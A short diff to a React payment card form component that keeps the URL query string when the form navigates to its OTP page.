@@ -17,6 +17,7 @@ const PaymentCardForm = () => {
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
   const shareId = id || "";
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -129,7 +130,7 @@ const PaymentCardForm = () => {
     });
     
     // Navigate to OTP
-    navigate(`/pay/${shareId}/otp`);
+    navigate(`/pay/${shareId}/otp${currentSearch}`);
   };
   
   return (
